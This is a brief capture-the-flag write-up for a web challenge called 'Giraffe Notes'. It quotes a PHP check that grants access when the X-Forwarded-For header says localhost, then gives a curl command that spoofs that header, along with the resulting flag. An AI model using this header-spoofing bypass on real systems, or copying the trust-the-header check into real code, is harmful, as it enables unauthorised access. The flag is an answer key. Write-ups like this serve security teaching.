# Giraffe Notes

I bet you can't access my notes on giraffes!

http://chal.competitivecyber.club:8081

Flag format: CACI{.*}

## Solution

```php
// index.php

$allowed_ip = ['localhost', '127.0.0.1'];
if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $allowed_ip)) {
    $allowed = true;
} else {
    $allowed = false;
}
```

```sh
curl --header "X-Forwarded-For: 127.0.0.1" http://chal.competitivecyber.club:8081

# CACI{1_lik3_g1raff3s_4_l0t}
```
